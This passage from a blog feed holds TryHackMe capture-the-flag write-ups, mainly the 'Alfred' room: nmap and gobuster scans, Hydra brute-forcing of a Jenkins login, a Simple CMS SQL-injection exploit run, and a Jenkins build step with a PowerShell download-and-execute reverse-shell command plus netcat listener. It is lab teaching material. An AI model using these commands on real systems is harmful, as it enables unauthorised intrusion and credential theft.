<p>After that we can just review a bit to see what we find. From the room&rsquo;s question we know we need to locate the root flag. So let&rsquo;s browse to the root folder and see if it is there:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@Machine:/root# ls
root.txt
root@Machine:/root# cat root.txt
<span style="color:#f92672">{</span>The_Root_Flag_Value_here<span style="color:#f92672">}</span>
root@Machine:/root# 
</code></pre></div><p>Having found a way to get root access, we can now answer the question 10.</p>
<blockquote>
<p>Question #10: What&rsquo;s the root flag?</p>
</blockquote>
<p>But we are still missing the CVE number answer to question #3 and also the answer to question #4. It seems we need to find some additional information. These are the questions still pending:</p>
<blockquote>
<p>Question #3: What&rsquo;s the CVE you&rsquo;re using against the application?</p>
</blockquote>
<blockquote>
<p>Question #4: To what kind of vulnerability is the application vulnerable?</p>
</blockquote>
<p>Maybe we missed something but we surely forgot to run a <strong>gobuster</strong> scan. Let&rsquo;s do that now:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>tzero86㉿tzbox<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
└─$ gobuster dir -u http://10.10.49.87/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
<span style="color:#f92672">===============================================================</span>
Gobuster v3.0.1
by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@_FireFart_<span style="color:#f92672">)</span>
<span style="color:#f92672">===============================================================</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:            http://10.10.49.87/
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:        <span style="color:#ae81ff">10</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Status codes:   200,204,301,302,307,401,403
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:     gobuster/3.0.1
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:        10s
<span style="color:#f92672">===============================================================</span>
2020/08/21 14:48:02 Starting gobuster
<span style="color:#f92672">===============================================================</span>
/simple <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span>

</code></pre></div><p>This will take some time. Let&rsquo;s see what&rsquo;s that <strong>/simple</strong> directory about.</p>
<p><img src="https://imgur.com/IjeZ6cvl.png" alt="We get a Simple CMS welcome page"></p>
<p>So we have a Simple CMS running on the machine and we even get pointed to <strong>/simple/admin/</strong> to log in.</p>
<p><img src="https://imgur.com/mZDKOlYl.png" alt="We get an admin login panel"></p>
<p>Let&rsquo;s see if we can find any CVE for this CMS.</p>
<p>Looking on Exploit-DB we get an SQL injection CVE:</p>
<p><img src="https://i.imgur.com/evabUPI.png" alt="CVE for this CMS"></p>
<p>Let&rsquo;s download this python exploit file and see what it does. In this case I renamed the exploit as <strong>exploit.py</strong></p>
<p>First we need to make this file executable and then we can run our exploit. Also note that this script runs with <strong>python2</strong> and not with <strong>python3</strong>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>tzero86㉿tzbox<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/easyCTF<span style="color:#f92672">]</span>
└─$ python exploit.py --u http://10.10.49.87/simple/ --crack -w /usr/share/wordlists/rockyou.txt

</code></pre></div><p>This script is very unreliable, it crashes a lot. In the end we should see something like this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Try: 1di
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Try: 1do
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Salt <span style="color:#66d9ef">for</span> password found: *************
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Username found: mitch
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Email found: admin@admin.com
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Password found: ***********************
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Password cracked: ******
</code></pre></div><p>With that we are able to fully answer all questions for the room and we saw how to get the flags. I believe running <strong>gobuster</strong> right along with <strong>Nmap</strong> was the right way to go. In that case dealing with this script and cracking the password for the CMS would have given us the password for the SSH connection. Anyways, there could be other ways to go about this box. This was mine.</p>
<p>As usual, happy hacking.</p>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">

<div class="container" style="margin:10px !important">
    <div class="center">
        <script src="https://tryhackme.com/badge/71634"></script>
    </div>
    <div class="center">
        <a href="https://twitter.com/Tzero86" target="_blank" class="fa fa-twitter" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a>
        <a href="https://github.com/Tzero86" target="_blank" class="fa fa-github" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a> 
        <br> 
</div>
]]></content>
        </item>
        
        <item>
            <title>Alfred_writeup.sh</title>
            <link>https://tzero86-bits.netlify.app/posts/alfred_writeup/</link>
            <pubDate>Sun, 16 Aug 2020 14:00:11 -0400</pubDate>
            
            <guid>https://tzero86-bits.netlify.app/posts/alfred_writeup/</guid>
            <description>Alfred - TryHackme&amp;rsquo;s Room Writeup This is my first attempt at creating a write-up, I tried putting every single step I took to solve this room. While providing enough (I think) details and descriptions so it is useful for noobs like me mostly. I started drafting this at the same time I managed to solve a question or even right after thinking a way to approach a solution for any of those.</description>
            <content type="html"><![CDATA[<h2 id="alfred---tryhackmes-room-writeup">Alfred - TryHackme&rsquo;s Room Writeup</h2>
<p>This is my first attempt at creating a write-up, I tried putting every single step I took to solve this room. While providing enough (I think) details and descriptions so it is useful for noobs like me mostly. I started drafting this at the same time I managed to solve a question or even right after thinking a way to approach a solution for any of those. I even left some futile attempts of enumeration to be honest about my process of solving this. I hope somebody finds this useful somehow, it certainly helped me to practice some tools and approaches. As I&rsquo;m still quite new to this, you can expect some errors in this post or maybe spot some things that an experienced person could probably solve better. I&rsquo;m learning, beware of the blog.</p>
<h2 id="task-1---getting-initial-access">[Task 1] - Getting Initial Access</h2>
<p>For this room it seems we&rsquo;ll need <strong>Nishang</strong> in order to gain access to the machine by using <strong><em>reverse shell scripts</em></strong>.</p>
<p>So lets start by listing the links to get this <strong>Nishang</strong> tool:</p>
<ul>
<li><strong>Nishang</strong>: <a href="https://github.com/samratashok/nishang">Click here</a> to access the repository and get this Powershell toolset.</li>
<li><strong>Alfred Room on THM</strong>: <a href="https://tryhackme.com/room/alfred">Click here</a> to visit this room on TryHackme platform.</li>
</ul>
<p>Ok once you have that tool downloaded to your system we can get started. Let&rsquo;s go question by question as designed for this THM box.</p>
<blockquote>
<p>Question #1: How many ports are open?</p>
</blockquote>
<p>Ok so for this question we&rsquo;ll run <strong>Nmap</strong> to enumerate any open ports. It is important to note that the room description mentions this machine <strong>won&rsquo;t respond to ping (ICMP)</strong> requests. So we&rsquo;ll need to add a switch to deal with that when running our scan.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">sudo nmap -A -Pn -p- 10.10.177.5

</code></pre></div><p>We&rsquo;ll use the switch/flag <strong>-Pn</strong> to avoid <strong>Nmap</strong> doing a ping before starting the scans. Also we use <strong>-p-</strong> to scan for all the ports  instead of the most common ones.</p>
<p>Once we get our results back we&rsquo;ll now the response for the first question. <em>Scanning all ports might take a while.</em></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2020-08-16 14:19 EDT
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.177.5
Host is up <span style="color:#f92672">(</span>0.39s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">65532</span> filtered ports
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Site doesn<span style="color:#e6db74">&#39;t have a title (text/html).
</span><span style="color:#e6db74">3389/tcp open  ssl/ms-wbt-server?
</span><span style="color:#e6db74">8080/tcp open  http               Jetty 9.4.z-SNAPSHOT
</span><span style="color:#e6db74">| http-robots.txt: 1 disallowed entry 
</span><span style="color:#e6db74">|_/
</span><span style="color:#e6db74">|_http-server-header: Jetty(9.4.z-SNAPSHOT)
</span><span style="color:#e6db74">|_http-title: Site doesn&#39;</span>t have a title <span style="color:#f92672">(</span>text/html;charset<span style="color:#f92672">=</span>utf-8<span style="color:#f92672">)</span>.
Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
Aggressive OS guesses: Microsoft Windows Server <span style="color:#ae81ff">2008</span> R2 SP1 <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2008</span> <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2008</span> R2 <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2008</span> R2 or Windows <span style="color:#ae81ff">8</span> <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, Microsoft Windows <span style="color:#ae81ff">7</span> SP1 <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, Microsoft Windows 8.1 Update <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, Microsoft Windows Phone 7.5 or 8.0 <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, Microsoft Windows <span style="color:#ae81ff">7</span> or Windows Server <span style="color:#ae81ff">2008</span> R2 <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2008</span> or <span style="color:#ae81ff">2008</span> Beta <span style="color:#ae81ff">3</span> <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>, Microsoft Windows Server <span style="color:#ae81ff">2008</span> R2 or Windows 8.1 <span style="color:#f92672">(</span>89%<span style="color:#f92672">)</span>
No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
Network Distance: <span style="color:#ae81ff">4</span> hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE <span style="color:#f92672">(</span>using port 8080/tcp<span style="color:#f92672">)</span>
HOP RTT       ADDRESS
<span style="color:#ae81ff">1</span>   247.10 ms 10.13.0.1
<span style="color:#ae81ff">2</span>   ... <span style="color:#ae81ff">3</span>
<span style="color:#ae81ff">4</span>   385.31 ms 10.10.177.5

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 558.59 seconds

</code></pre></div><p>Ok, so based on these results we now know how many ports are open.</p>
<blockquote>
<p>Question #2: What is the username and password for the login panel(in the format username:password)?</p>
</blockquote>
<p>Ok let&rsquo;s start by seeing what is being served in the port <strong>80</strong> of this machine.</p>
<p><img src="https://i.imgur.com/FK0zWJh.png" alt="enter image description here">
Ok so we get an email <em><strong>﻿alfred@wayneenterprises.com</strong></em>, and a picture. Let&rsquo;s see if we get any other useful information by inspecting the <strong>DOM</strong>.</p>
<p>It seems there is not much info lying around the code of the page. It is always worth checking anyway.</p>
<p>The next thing we can check, is to review if we may have any data encrypted into that image of Bruce Wayne.  So let&rsquo;s download it.</p>
<p>At this point we would need a <strong>passphrase</strong> if we want to attempt to extract any possibly hidden data in from this image. Since we don&rsquo;t have any piece of info so far that could act as a passphrase. We&rsquo;ll move forward from this for now. Also we are not even sure if this image has had any <strong>steganography</strong> job done.</p>
<p>I would be wise to start scanning for some other directories we might be able to access. Let&rsquo;s use GoBuster.</p>
<p>let&rsquo;s start a GoBuster scan with a small list first and see how it goes.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -u http://10.10.177.5/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
</code></pre></div><p>This might also take some time to run, but once it finishes we should have a better idea if there are any common directories that we can access.</p>
<p>This is what the GoBuster scan in progress looks like:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">===============================================================</span>
Gobuster v3.0.1
by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@_FireFart_<span style="color:#f92672">)</span>
<span style="color:#f92672">===============================================================</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:            http://10.10.177.5/
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:        <span style="color:#ae81ff">10</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Status codes:   200,204,301,302,307,401,403
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:     gobuster/3.0.1
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:        10s
<span style="color:#f92672">===============================================================</span>
2020/08/16 14:45:12 Starting gobuster
<span style="color:#f92672">===============================================================</span>
Progress: <span style="color:#ae81ff">11841</span> / <span style="color:#ae81ff">87665</span> <span style="color:#f92672">(</span>13.51%<span style="color:#f92672">)</span>

</code></pre></div><p>While we wait for GoBuster to try to find any directories. Let&rsquo;s take a look at what we have at port <strong>8080</strong>.</p>
<p><img src="https://i.imgur.com/oLuheqV.png" alt="port 8080 login page">
Ok so we get a login form, we might as well try out some basic user:password combinations to see if maybe the security has overlooked something that basic.</p>
<p>We can go with the basic <strong>admin:1234</strong>, <strong>admin:password</strong>, <strong>admin:admin</strong>, etc.</p>
<p>Look at that, using <strong>admin:admin</strong> to log in has granted us access to Jenkins.</p>
<p><img src="https://i.imgur.com/kzHXdI4.png" alt="Jenkins admin panel"></p>
<p><strong><em>But wait, what if we didn&rsquo;t managed to find that super insecure credential?</em></strong> Well, in that case we should try to demonstrate how to use a combination of Burp and Hydra to brute force the login form. Let&rsquo;s look into that now.</p>
<p>To start let&rsquo;s launch <strong>Burp Suite</strong>, we&rsquo;ll be using the integrated browser to navigate the site and review the details of the login request it gets sent when we attempt to log into Jenkins.</p>
<p><img src="https://i.imgur.com/SBakfmQ.png" alt="Burp Suite"></p>
<blockquote>
<p><em>NOTE:</em> If you get an error about the integrated browser not able to run due to sandboxed settings. Got to Project Options -&gt; Misc -&gt; Check &ldquo;allow the embedded browser to run without a sandbox&rdquo;.</p>
</blockquote>
<p>Once you have Burp running in the <strong>Proxy -&gt; Intercept</strong> tab click on <strong>Open Browser</strong>. In the new Browser window open the machine IP at port 8080 to load the Jenkins login form.</p>
<ul>
<li>Remember to add the target IP to Burp&rsquo;s Scope, so it doesn&rsquo;t stop every single request from non-target related IPs.</li>
</ul>
<p>Ok so in order to brute force the login with Hydra, we need to Intercept a login request with Burp so we can get some important pieces of Information: <strong>[URL]</strong>, <strong>[UsernameField]</strong>, <strong>[PasswordField]</strong> and the <strong>[InvalidCredentialsErrorMessage]</strong>. These are all required for our Hydra attack.</p>
<p>To get those, let&rsquo;s attempt to login with some invalid credentials just as <strong>test:test</strong>.</p>
<p><img src="https://i.imgur.com/AKP9Wop.png" alt="Jenkins Login error"></p>
<p>Let&rsquo;s see the request in Burp:</p>
<p><img src="https://i.imgur.com/KL3wpw9.png" alt="Intercepted Login Request">
As we can see in the intercepted request we get the rest of the pieces we were looking for. So now we have all of them ready for Hydra:</p>
<ul>
<li><strong>[URL]</strong>: /j_acegi_security_check</li>
<li><strong>[UsernameField]</strong>: j_username</li>
<li><strong>[PasswordField]</strong>: j_password</li>
<li><strong>[InvalidCredentialsErrorMessage]</strong>: Invalid username or password</li>
</ul>
<p>We&rsquo;ll also need to know the <strong>[PORT]</strong> where the login forms lives, but we know that already from our Nmap scan(8080).</p>
<p>So now let&rsquo;s try to configure <strong>Hydra</strong> so we can trigger that brute force attack.</p>
<p>First let&rsquo;s review the required parameters we must specify and how our command its formated:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo hydra -s <span style="color:#f92672">[</span>PORT<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>IP<span style="color:#f92672">]</span> http-form-post <span style="color:#e6db74">&#34;/[URL]:[UsernameField]=^USER^&amp;[PasswordField]=^PASS^:[InvalidCredentialsErrorMessage]&#34;</span> -L rockyou.txt -P rockyou.txt
</code></pre></div><p>So if we fill in the required data, and using rockyou.txt our command will look like this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo hydra -s <span style="color:#ae81ff">8080</span> 10.10.192.65 http-form-post <span style="color:#e6db74">&#34;/j_acegi_security_check:j_username=^USER^&amp;j_password=^PASS^:Invalid username or password&#34;</span> -L rockyou.txt -P rockyou.txt
</code></pre></div><p>This might take a while to complete and we probably have to locate a better password/usernames wordlist, so it is worth mentioning <strong>SecLists</strong> as a great resource for those. Check <a href="https://github.com/danielmiessler/SecLists">this link</a>.</p>
<p>After a while we should see something like this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Hydra v9.1 <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2020</span> by van Hauser/THC &amp; David Maciejak - Please <span style="color:#66d9ef">do</span> not use in military or secret service organizations, or <span style="color:#66d9ef">for</span> illegal purposes <span style="color:#f92672">(</span>this is non-binding, these *** ignore laws and ethics anyway<span style="color:#f92672">)</span>.

Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> starting at 2020-08-17 14:10:53
<span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> max <span style="color:#ae81ff">16</span> tasks per <span style="color:#ae81ff">1</span> server, overall <span style="color:#ae81ff">16</span> tasks, <span style="color:#ae81ff">205761065451876</span> login tries <span style="color:#f92672">(</span>l:14344374/p:14344374<span style="color:#f92672">)</span>, ~12860066590743 tries per task
<span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> attacking http-post-form://10.10.192.65:8080/j_acegi_security_check:j_username<span style="color:#f92672">=</span>^USER^&amp;j_password<span style="color:#f92672">=</span>^PASS^:Invalid username or password
<span style="color:#f92672">[</span>STATUS<span style="color:#f92672">]</span> 384.00 tries/min, <span style="color:#ae81ff">384</span> tries in 00:01h, <span style="color:#ae81ff">205761065451492</span> to <span style="color:#66d9ef">do</span> in 8930601799:07h, <span style="color:#ae81ff">16</span> active
<span style="color:#f92672">[</span>STATUS<span style="color:#f92672">]</span> 384.00 tries/min, <span style="color:#ae81ff">1152</span> tries in 00:03h, <span style="color:#ae81ff">205761065450724</span> to <span style="color:#66d9ef">do</span> in 8930601799:05h, <span style="color:#ae81ff">16</span> active
<span style="color:#f92672">[</span>STATUS<span style="color:#f92672">]</span> 381.71 tries/min, <span style="color:#ae81ff">2672</span> tries in 00:07h, <span style="color:#ae81ff">205761065449204</span> to <span style="color:#66d9ef">do</span> in 8984078456:30h, <span style="color:#ae81ff">16</span> active

</code></pre></div><p>As you can see this attack is gonna take a while since rockyou.txt is quite a large list. So let&rsquo;s use one of the SecList&rsquo;s shorter lists called <a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/best1050.txt"><strong>best1050.txt</strong></a>.</p>
<p>With the new list we get our result much faster:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo hydra -s <span style="color:#ae81ff">8080</span> 10.10.192.65 http-form-post <span style="color:#e6db74">&#34;/j_acegi_security_check:j_username=^USER^&amp;j_password=^PASS^:Invalid username or password&#34;</span> -L best1050.txt -P best1050.txt -w <span style="color:#ae81ff">30</span>
Hydra v9.1 <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2020</span> by van Hauser/THC &amp; David Maciejak - Please <span style="color:#66d9ef">do</span> not use in military or secret service organizations, or <span style="color:#66d9ef">for</span> illegal purposes <span style="color:#f92672">(</span>this is non-binding, these *** ignore laws and ethics anyway<span style="color:#f92672">)</span>.

Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> starting at 2020-08-17 14:32:55
<span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> max <span style="color:#ae81ff">16</span> tasks per <span style="color:#ae81ff">1</span> server, overall <span style="color:#ae81ff">16</span> tasks, <span style="color:#ae81ff">1102500</span> login tries <span style="color:#f92672">(</span>l:1050/p:1050<span style="color:#f92672">)</span>, ~68907 tries per task
<span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> attacking http-post-form://10.10.192.65:8080/j_acegi_security_check:j_username<span style="color:#f92672">=</span>^USER^&amp;j_password<span style="color:#f92672">=</span>^PASS^:Invalid username or password
<span style="color:#f92672">[</span>STATUS<span style="color:#f92672">]</span> 384.00 tries/min, <span style="color:#ae81ff">384</span> tries in 00:01h, <span style="color:#ae81ff">1102116</span> to <span style="color:#66d9ef">do</span> in 47:51h, <span style="color:#ae81ff">16</span> active
<span style="color:#f92672">[</span>STATUS<span style="color:#f92672">]</span> 384.00 tries/min, <span style="color:#ae81ff">1152</span> tries in 00:03h, <span style="color:#ae81ff">1101348</span> to <span style="color:#66d9ef">do</span> in 47:49h, <span style="color:#ae81ff">16</span> active
<span style="color:#f92672">[</span>8080<span style="color:#f92672">][</span>http-post-form<span style="color:#f92672">]</span> host: 10.10.192.65   login: admin   password: admin
</code></pre></div><p>So that gives us the answer to Question #2 in a brute-forced way.</p>
<p>Let&rsquo;s move to the next objective.</p>
<blockquote>
<p>Find a feature of the tool that allows you to execute commands on the underlying system. When you find this feature, you can use this command to get the reverse shell on your machine and then run it: <strong><em>powershell iex (New-Object Net.WebClient).DownloadString(&lsquo;http://your-ip:your-port/Invoke-PowerShellTcp.ps1&rsquo;);Invoke-PowerShellTcp -Reverse -IPAddress your-IP -Port your-port</em></strong></p>
</blockquote>
<p>Well this objective kind of gives us quite a hit at what to do next. I figure we need to find a way to execute that on our newly accessed server. Let&rsquo;s take a look at what can we do in our Jenkins admin panel.</p>
<p>If we take a look at the existing jobs in the server, we see this job called <strong>project</strong> which was last run months ago, but it also ran successfully.</p>
<p><img src="https://i.imgur.com/cilmo5K.png" alt="Running Job on the server">
Let&rsquo;s click on the job name to see what else we got here.</p>
<p><img src="https://i.imgur.com/9IRIUNm.png" alt="Job details page">
If we click the <strong>configure</strong> button on this dashboard. We get the specific details of what this job does. Let&rsquo;s scroll down to the <strong>Build</strong> to see some more info.</p>
<p><img src="https://i.imgur.com/T86ylyd.png" alt="Job build command">
So this job only runs a <strong>whoami</strong> command. I figure we can just use this section to place our exploitation command as suggested by the room&rsquo;s hint.</p>
<p>Ok, so the idea is this, we&rsquo;ll locally create a <strong>Python3 HTTP Server</strong> to serve the PowerShell script we get from <strong>Nishang</strong>  and we add the command to retrieve that script from our local sever into the Jenkin&rsquo;s Job build command.</p>
<p>Ok so looking at <strong>Nishang&rsquo;s</strong> folder we see that we have all scripts categorized. We&rsquo;ll be attempting to get a reverse shell, so let&rsquo;s look inside <strong>/nishang/Shells/</strong></p>
<p>From the room&rsquo;s hint we already know we are looking for, <strong>Invoke-PowerShellTcp.ps1</strong></p>
<p>So let&rsquo;s get this file shared in our local HTTP server.
We navigate to the <strong>Shells</strong> folder and fire up our server like this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo python3 -m http.server
</code></pre></div><p>We should see something like this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8000</span> <span style="color:#f92672">(</span>http://0.0.0.0:8000/<span style="color:#f92672">)</span> ...
</code></pre></div><p>So our server is ready. Let&rsquo;s get that command set on the Jenkins job next.</p>
<p>Ok, let&rsquo;s review the command. We need to make some adjustments before we paste it into Jenkins.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">powershell iex (New-Object Net.WebClient).DownloadString(<span style="color:#e6db74">&#39;http://your-ip:your-port/Invoke-PowerShellTcp.ps1&#39;</span>);Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
</code></pre></div><p>We need to change the <strong>IP and Port</strong>  and also make sure we specify a port value for our reverse shell. So this full command would attempt to connect to our local server to get the PS script and then open a reverse shell on a specific port to connect to our local listener(we&rsquo;ll do that in a bit).</p>
<blockquote>
<p><strong>Remember to get your correct IP when connected to THMs VPN. It is usually tun0. Run <em>ip add</em> command to see your IP.</strong></p>
</blockquote>
<p>In my case the command will look like this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">powershell iex (New-Object Net.WebClient).DownloadString(<span style="color:#e6db74">&#39;http://10.13.0.34:8000/Invoke-PowerShellTcp.ps1&#39;</span>);Invoke-PowerShellTcp -Reverse -IPAddress 10.13.0.34 -Port 6666
</code></pre></div><p>We have the command ready, we are just missing one tiny crucial part. We need to open a local listener on port 666 so our exploit can successfully open a reverse shell. Let&rsquo;s do that.</p>
<p>In a terminal window start a <strong>netcat</strong> listener on port <strong>6666</strong>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nc -lvp <span style="color:#ae81ff">6666</span>
listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">6666</span> ...
</code></pre></div><p>That&rsquo;s done, now to paste our full command into the Jenkins Job Build command section.</p>
<p><img src="https://i.imgur.com/aWPWDUy.png" alt="We enter our exploit command">
After we enter the command, we click on the <strong>Save</strong> button to save the changes.</p>
<p>Then we go back to the main project details page.
Let&rsquo;s trigger a new build by clicking on <strong>Build Now</strong> button so we see if your command runs fine.</p>
<p><img src="https://i.imgur.com/2RYq1y7.png" alt="Build Now button"></p>
<p>We see a new build has been queued:</p>
<p><img src="https://i.imgur.com/blngU7y.png" alt="our basic HTTP server works">
We see that our local server has received a request to serve a file, this seems to be working fine so far:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8000</span> <span style="color:#f92672">(</span>http://0.0.0.0:8000/<span style="color:#f92672">)</span> ...
10.10.177.5 - - <span style="color:#f92672">[</span>16/Aug/2020 16:58:25<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /Invoke-PowerShellTcp.ps1 HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> -
</code></pre></div><p>Let&rsquo;s see if something happened in our listener:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">6666</span> ...
10.10.177.5: inverse host lookup failed: Unknown host
connect to <span style="color:#f92672">[</span>10.13.0.34<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.177.5<span style="color:#f92672">]</span> <span style="color:#ae81ff">49204</span>
Windows PowerShell running as user bruce on ALFRED
Copyright <span style="color:#f92672">(</span>C<span style="color:#f92672">)</span> <span style="color:#ae81ff">2015</span> Microsoft Corporation. All rights reserved.

PS C:<span style="color:#ae81ff">\P</span>rogram Files <span style="color:#f92672">(</span>x86<span style="color:#f92672">)</span><span style="color:#ae81ff">\J</span>enkins<span style="color:#ae81ff">\w</span>orkspace<span style="color:#ae81ff">\p</span>roject&gt;

</code></pre></div><p>We got a reverse shell successfully!</p>
